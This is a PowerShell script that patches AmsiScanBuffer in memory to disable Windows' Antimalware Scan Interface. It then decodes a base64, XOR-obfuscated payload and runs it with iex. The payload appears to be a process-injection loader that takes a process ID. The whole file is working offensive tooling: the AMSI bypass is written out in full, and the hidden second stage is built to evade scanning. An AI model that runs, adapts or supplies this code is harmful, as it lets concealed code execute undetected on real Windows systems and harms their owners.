$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)

$enc = [system.Text.Encoding]::UTF8

$EncodedText = "RmN4ZXQ8WX5iZTEzLCwsX1AsLCwzHBs1KXIlJCEgJCcocCV1JSkldCglcnQncyQhdSV0JygiKCkxLDFDdHB1PFl+YmUxM0FjdGJiMVR/ZXRjMWV+MXJ+f2V4f2R0MxwbUHV1PEVoYXQxPEVoYXRVdHd4f3hleH5/MVEzHBtkYnh/djFCaGJldHwqHBtkYnh/djFCaGJldHw/VXhwdn9+YmV4cmIqHBtkYnh/djFCaGJldHw/Q2R/ZXh8dD9Yf2V0Y35hQnRjZ3hydGIqHBthZHN9eHIxcn1wYmIxX1B8YhwbahwbMTExMWFkc314cjFyfn9iZTF4f2UxQUNeUlRCQk5HXE5eQVRDUEVYXl8xLDEhaSEhISkqHBsxMTExYWRzfXhyMXJ+f2JlMXh/ZTFBQ15SVEJCTkdcTkNUUFUxLDEhaSEhICEqHBsxMTExYWRzfXhyMXJ+f2JlMXh/ZTFBQ15SVEJCTkdcTkZDWEVUMSwxIWkhISMhKhwbMTExMWFkc314cjFyfn9iZTFkeH9lMUFQVlROVElUUkRFVE5DVFBVRkNYRVQxLDEhaSUhKhwbHBsxMTExSlV9fVh8YX5jZTkzf2V1fX0/dX19MzhMHBsxMTExYWRzfXhyMWJlcGV4cjF0aWV0Y38xeH9lMV9lXmF0f0FjfnJ0YmI5fmRlMVh/ZUFlYzFBY35ydGJiWXB/dX10PTFkeH9lMVV0YnhjdHVQcnJ0YmI9MUpYf0wxY3R3MV5TW1RSRU5QRUVDWFNERVRCMV5ze3RyZVBlZWN4c2RldGI9MUpYf0wxY3R3MVJdWFRfRU5YVTFSfXh0f2VYdTgqHBscGzExMTFKVX19WHxhfmNlOTN/ZXV9fT91fX0zOEwcGzExMTFhZHN9eHIxYmVwZXhyMXRpZXRjfzF4f2UxX2VGY3hldEd4Y2VkcH1cdHx+Y2g5WH9lQWVjMUFjfnJ0YmJZcH91fXQ9MVh/ZUFlYzFTcGJ0UHV1Y3RiYj0xc2hldEpMMVNkd3d0Yz0xZHh/ZTFfZHxzdGNed1NoZXRiRX5GY3hldD0xfmRlMWR4f2UxX2R8c3RjXndTaGV0YkZjeGVldH84KhwbHBsxMTExSlV9fVh8YX5jZTkzf2V1fX0/dX19MzhMHBsxMTExYWRzfXhyMWJlcGV4cjF0aWV0Y38xeH9lMV9lUn1+YnQ5WH9l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dygiJXUhIyggIyZzd3VwIiV3dXIiICU9MUpjdHdMNSIkJClwdSJzJHcnISUpJHdzdyN1JCInJiJ1cHJydCchOBwbMTExMXh3MTk1JyUkKHUkKXMlJXAoJScjcCkpKSEmKCl1cyh0dHIkcnAxPH90MSE4MWocGzExMTExMTExRmN4ZXQ8WX5iZTEzV3B4fTMcGzExMTExMTExY3RlZGN/HBsxMTExbBwbMTExMTUjInIocyUjI3QlJncldyYjcykgcygmcCh0IiQiKXVwJDEsMUpfUHxiTCsrXX5wdV14c2NwY2g5M3B8Yng/dX19MzgcGzExMTF4dzE5NSMicihzJSMjdCUmdyV3JiNzKSBzKCZwKHQiJCIpdXAkMTx0YDFKWH9lQWVjTCsrS3RjfjgxahwbMTExMTExMTFGY3hldDxZfmJlMTNXcHh9MxwbMTExMTExMTFKX1B8YkwrK19lUn1+YnQ5NSIkKSN1JXcnIHd0JSUjJigodHN3IHNyKSklcCNzI3AgOBwbMTExMTExMTFjdGVkY38cGzExMTFsHBsxMTExNXAkIiQjISZ3ciJ3IiUnIXdzIHByc3QpICUpdHUhKSYgMSwxSl9QfGJMKytWdGVBY35yUHV1Y3RiYjk1IyJyKHMlIyN0JSZ3JXcmI3MpIHMoJnAodCIkIil1cCQ9MTNQfGJ4XmF0f0J0YmJ4fn8zOBwbMTExMXh3MTk1cCQiJCMhJndyInciJSchd3MgcHJzdCkgJSl0dSEpJiAxPHRgMUpYf2VBZWNMKytLdGN+ODFqHBsxMTExMTExMUZjeGV0PFl+YmUxM1dweH10dTFlfjF3eH91MVB8YnheYXR/QnRiYnh+fzF3ZH9yZXh+fzF4fzFwfGJ4P3V9fT8zMTxXfmN0dmN+ZH91Un59fmMxQ3R1HBsxMTExMTExMUpfUHxiTCsrX2VSfX5idDk1IiQpI3Uldycgd3QlJSMmKCh0c3cgc3IpKSVwI3MjcCA4HBsxMTExMTExMWN0ZWRjfxwbMTExMWwcGzExMTE1cyF1ciclI3UhcnQoJXR3c3NzJHUkISMidCAjcHQidygxLDFKWH9lQWVjTDk1cCQiJCMhJndyInciJSchd3MgcHJzdCkgJSl0dSEpJiA/RX5Yf2UnJTk4MToxIjgcGzExMTE1dCImJiIocicpIykmJSIocnAoKHJ0KSlwKSciJCUmdSMxLDFKRFh/ZSIjTCEcGzExMTE1dHBwdSVzdCQjISEnJSR1dykpKCcncHd3IiAjcHBwciAxLDFKRFh/ZUFlY0wrK390ZjkgODExMjFSfmNjdHJlMXJ+f2d0Y2J4fn8xZX4xRFh/ZUFlYxwbMTExMTV0dSIhJXVwcnQndyAlIXAmcHcicCckJXUjJCh1JSAgITEsMUpfUHxiTCsrR3hjZWRwfUFjfmV0cmVUaTk1IiQpI3Uldycgd3QlJSMmKCh0c3cgc3IpKSVwI3MjcCA9MTVzIXVyJyUjdSFydCgldHdzc3MkdSQhIyJ0ICNwdCJ3KD0xNXRwcHUlc3QkIyEhJyUkdXcpKSgnJ3B3dyIgI3BwcHIgPTFKX1B8YkwrK0FQVlROVElUUkRFVE5DVFBVRkNYRVQ9MUpjdHdMNXQiJiYiKHInKSMpJiUiKHJwKChydCkpcCknIiQlJnUjOBwbMTExMXh3MTk8f35lMTV0dSIhJXVwcnQndyAlIXAmcHcicCckJXUjJCh1JSAgITgxahwbMTExMTExMTFGY3hldDxZfmJlMTNXcHh9MxwbMTExMTExMTFKX1B8YkwrK19lUn1+YnQ5NSIkKSN1JXcnIHd0JSUjJigodHN3IHNyKSklcCNzI3AgOBwbMTExMTExMTFjdGVkY38cGzExMTFsHBsxMTExNXNzIichKSggdHR1dCVzKShzcHV3IXMmKXB1dCMhInVwMSwxSkJoYmV0fD9EWH9lIiNMIRwbMTExMTUnJSQodSQpcyUlcCglJyNwKSkpISYoKXVzKHR0ciRycDEsMUpfUHxiTCsrX2VGY3hldEd4Y2VkcH1cdHx+Y2g5NSIkKSN1JXcnIHd0JSUjJigodHN3IHNyKSklcCNzI3AgPTE1cyF1ciclI3UhcnQoJXR3c3NzJHUkISMidCAjcHQidyg9MUpzaGV0SkxMUTk1J3Amcil0ICcocCAkJSIpJyggICR0dSdyICEgJXNydyA4PTEgPTFKY3R3TDVzcyInISkoIHR0dXQlcykoc3B1dyFzJilwdXQjISJ1cDgcGzExMTF4dzE5NSclJCh1JClzJSVwKCUnI3ApKSkhJigpdXModHRyJHJwMTx0YDEhODFqHBsxMTExMTExMUZjeGV0PFl+YmUxM356MxwbMTExMWwxdH1idDFqHBsxMTExMTExMUZjeGV0PFl+YmUxM1dweH0zHBsxMTExbBwbMTExMTUgJil0c3JwJnNzciEldCgjcCMoKCklI3B0cyBwJCYiKDEsMUpfUHxiTCsrR3hjZWRwfUFjfmV0cmVUaTk1IiQpI3Uldycgd3QlJSMmKCh0c3cgc3IpKSVwI3MjcCA9MTVzIXVyJyUjdSFydCgldHdzc3MkdSQhIyJ0ICNwdCJ3KD0xNXRwcHUlc3QkIyEhJyUkdXcpKSgnJ3B3dyIgI3BwcHIgPTE1dCImJiIocicpIykmJSIocnAoKHJ0KSlwKSciJCUmdSM9MUpjdHdMNXQiJiYiKHInKSMpJiUiKHJwKChydCkpcCknIiQlJnUjOBwbMTExMXh3MTk8f35lMTUgJil0c3JwJnNzciEldCgjcCMoKCklI3B0cyBwJCYiKDgxahwbMTExMTExMTFGY3hldDxZfmJlMTNXcHh9MxwbMTExMWwcGzExMTFKX1B8YkwrK19lUn1+YnQ5NSIkKSN1JXcnIHd0JSUjJigodHN3IHNyKSklcCNzI3AgOBwbbBwbd2R/cmV4fn8xfHBhYnkxahwbMTExMVZ0ZTxBY35ydGJiMW0xRnl0Y3Q8XnN7dHJlMWoxNU4/QWN+cnRiYl9wfHQxPHRgMTNhfmZ0Y2J5dH19MzFsMW0xV35jVHByeTxec3t0cmUxahwbMTExMTExMTF8fnB4MTxhY35ydGJiWHUxNU4/WHUcGzExMTFsHBtsHBtGY3hldDxZfmJlMTNCZXBjZXh/djFicmN4YWU/Pz8zHBt8cGFieRwbRmN4ZXQ8WX5iZTEzUn58YX10ZXR1PzM="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))

